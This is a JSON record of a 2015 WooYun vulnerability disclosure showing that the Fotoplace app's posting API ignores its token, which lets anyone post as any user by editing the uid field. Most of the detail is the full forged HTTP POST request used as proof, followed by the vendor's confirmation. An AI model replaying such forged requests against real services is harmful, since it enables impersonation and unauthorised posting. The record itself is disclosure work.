{"id": 35974, "wybug_id": "wooyun-2015-0102844", "wybug_title": "足记app越权发送任意用户内容", "wybug_corp": "fotoplace.cc", "wybug_author": "Vern", "wybug_date": "2015-03-30 13:59", "wybug_open_date": "2015-05-14 14:42", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向公众公开  简要描述： 以任意用户权限发送  图形文字内容（一不小心大片即视感会跑偏哦） 详细说明：  自己在足记app上随便发送一个内容  然后抓包\n\n没有对token验证   id参数可以控制   修改为目标用户id  217然后提交包\nPOST /api2/home%2Fnewpost.php HTTP/1.1Content-Type: multipart/form-data; boundary=6df4609c-0455-47e6-b289-4f89229f7dddContent-Length: 748424Host: fotoplace.ccConnection: Keep-AliveAccept-Encoding: gzipUser-Agent: okhttp/2.3.0--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"version\"Content-Type: text/plain; charset=UTF-8Content-Length: 3Content-Transfer-Encoding: binary2.3--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"uid\"Content-Type: text/plain; charset=UTF-8Content-Length: 7Content-Transfer-Encoding: binary217--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"token\"Content-Type: text/plain; charset=UTF-8Content-Length: 64Content-Transfer-Encoding: binary--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"type\"Content-Type: text/plain; charset=UTF-8Content-Length: 4Content-Transfer-Encoding: binarypost--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"photo\"; filename=\"IMG_1426922379498.JPG\"Content-Type: Content-Length: 745335Content-Transfer-Encoding: binary--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"footprintId\"Content-Type: text/plain; charset=UTF-8Content-Length: 0Content-Transfer-Encoding: binary--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"syncFootprintToDb\"Content-Type: text/plain; charset=UTF-8Content-Length: 1Content-Transfer-Encoding: binary0--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"tags\"Content-Type: text/plain; charset=UTF-8Content-Length: 2Content-Transfer-Encoding: binary[]--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"text\"Content-Type: text/plain; charset=UTF-8Content-Length: 9Content-Transfer-Encoding: binarytest by wooyun--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"lat\"Content-Type: text/plain; charset=UTF-8Content-Length: 1Content-Transfer-Encoding: binary0--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"lng\"Content-Type: text/plain; charset=UTF-8Content-Length: 1Content-Transfer-Encoding: binary0--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"locationName\"Content-Type: text/plain; charset=UTF-8Content-Length: 0Content-Transfer-Encoding: binary--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"locationAddress\"Content-Type: text/plain; charset=UTF-8Content-Length: 0Content-Transfer-Encoding: binary--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"locationDesc\"Content-Type: text/plain; charset=UTF-8Content-Length: 0Content-Transfer-Encoding: binary--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"topicTag\"Content-Type: text/plain; charset=UTF-8Content-Length: 0Content-Transfer-Encoding: binary--6df4609c-0455-47e6-b289-4f89229f7dddContent-Disposition: form-data; name=\"activityId\"Content-Type: text/plain; charset=UTF-8Content-Length: 0Content-Transfer-Encoding: binary--6df4609c-0455-47e6-b289-4f89229f7ddd--\n\n\n上传成功   漏洞证明：  \n\n   修复方案：  各种验证  app上的大部分token都没起作用   版权声明：转载请注明来源 Vern@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-03-30 14:40 厂商回复： 多谢Vern 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-21 18:26 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  建立数据库连接时出错...   他们已经成这了。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}